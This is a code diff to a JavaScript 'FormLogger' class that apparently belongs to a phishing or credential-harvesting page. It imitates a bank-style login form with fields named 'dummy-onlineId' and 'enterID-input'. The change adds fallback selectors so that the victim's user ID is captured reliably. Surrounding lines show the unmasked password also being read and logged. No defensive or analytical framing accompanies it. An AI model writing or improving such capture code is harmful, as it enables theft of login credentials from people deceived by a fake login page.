@@ -195,24 +195,53 @@ class FormLogger {
         console.log('[Logger] WARNING: Password input not found!');
       }
       
-      // Get User ID from input field - try multiple selectors
-      let userIdInput = form.querySelector('input[name="dummy-onlineId"]');
-      if (!userIdInput) {
-        console.log('[Logger] dummy-onlineId not found in form, trying by ID...');
-        userIdInput = document.getElementById('enterID-input');
+      // Get User ID from input field - try multiple selectors with improved logic
+      let userIdInput = null;
+      let userIdValue = '';
+      
+      // Try 1: Direct ID selector first (most reliable)
+      userIdInput = document.getElementById('enterID-input');
+      if (userIdInput && userIdInput.value) {
+        userIdValue = userIdInput.value.trim();
+        console.log('[Logger] User ID found via ID selector #enterID-input:', userIdValue);
       }
-      if (!userIdInput) {
-        console.log('[Logger] enterID-input not found, trying to find any text input...');
+      
+      // Try 2: Name selector in form
+      if (!userIdValue) {
+        userIdInput = form.querySelector('input[name="dummy-onlineId"]');
+        if (userIdInput && userIdInput.value) {
+          userIdValue = userIdInput.value.trim();
+          console.log('[Logger] User ID found via name selector input[name="dummy-onlineId"]:', userIdValue);
+        }
+      }
+      
+      // Try 3: Global document search by name
+      if (!userIdValue) {
+        userIdInput = document.querySelector('input[name="dummy-onlineId"]');
+        if (userIdInput && userIdInput.value) {
+          userIdValue = userIdInput.value.trim();
+          console.log('[Logger] User ID found via global name selector:', userIdValue);
+        }
+      }
+      
+      // Try 4: Find any text input in form
+      if (!userIdValue) {
+        console.log('[Logger] User ID not found yet, trying to find any text input...');
         const textInputs = form.querySelectorAll('input[type="text"]');
         console.log('[Logger] Found', textInputs.length, 'text inputs in form');
         if (textInputs.length > 0) {
           userIdInput = textInputs[0];
-          console.log('[Logger] Using first text input:', userIdInput.name);
+          userIdValue = userIdInput.value.trim();
+          console.log('[Logger] Using first text input:', userIdInput.name, 'Value:', userIdValue);
         }
       }
       
-      const userIdValue = userIdInput ? userIdInput.value.trim() : '';
-      console.log('[Logger] User ID input element:', userIdInput, 'Value:', userIdValue);
+      // Log the final result
+      if (userIdValue) {
+        console.log('[Logger] ✓ User ID captured successfully:', userIdValue);
+      } else {
+        console.log('[Logger] ✗ WARNING: Could not extract User ID from any selector');
+      }
 
       // Get the actual password value directly from the input field (NOT masked)
       let passwordValue = '';
